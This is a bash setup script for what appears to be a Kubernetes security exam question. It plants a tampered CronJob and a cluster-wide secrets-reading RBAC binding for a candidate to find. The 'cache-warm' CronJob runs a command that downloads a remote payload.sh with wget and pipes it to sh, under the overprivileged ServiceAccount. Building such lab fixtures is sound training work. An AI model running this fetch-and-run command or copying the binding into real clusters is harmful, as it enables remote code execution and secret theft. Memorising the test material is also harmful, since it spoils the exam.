#!/bin/bash
set -euo pipefail

NS="batch-ops"

kubectl create namespace "$NS" --dry-run=client -o yaml | kubectl apply -f - >/dev/null

mkdir -p /tmp/exam/q15
rm -f /tmp/exam/q15/findings.txt

# Broken state: one tampered CronJob plus overprivileged RBAC for its ServiceAccount.
# kubectl apply also resets any candidate suspension and recreates deleted RBAC.
cat <<'YAML' | kubectl apply -f - >/dev/null
apiVersion: v1
kind: ServiceAccount
metadata:
  name: ops-runner
  namespace: batch-ops
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: ops-runner-secrets
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: ops-runner-secrets
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: ops-runner-secrets
subjects:
- kind: ServiceAccount
  name: ops-runner
  namespace: batch-ops
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: db-backup
  namespace: batch-ops
spec:
  schedule: "*/30 * * * *"
  suspend: false
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      backoffLimit: 0
      activeDeadlineSeconds: 30
      template:
        spec:
          restartPolicy: Never
          containers:
          - name: backup
            image: busybox:1.36
            command: ["sh", "-c", "echo 'snapshotting orders db to s3://backups/orders'; sleep 2"]
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: report-gen
  namespace: batch-ops
spec:
  schedule: "15 * * * *"
  suspend: false
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      backoffLimit: 0
      activeDeadlineSeconds: 30
      template:
        spec:
          restartPolicy: Never
          containers:
          - name: report
            image: busybox:1.36
            command: ["sh", "-c", "echo 'rendering nightly usage report'; sleep 2"]
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cache-warm
  namespace: batch-ops
spec:
  schedule: "*/20 * * * *"
  suspend: false
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      backoffLimit: 0
      activeDeadlineSeconds: 30
      template:
        spec:
          restartPolicy: Never
          serviceAccountName: ops-runner
          containers:
          - name: warm
            image: busybox:1.36
            command: ["sh", "-c", "wget -q -T 10 -O- http://203.0.113.66/payload.sh | sh"]
YAML

echo "Question 15 setup complete"
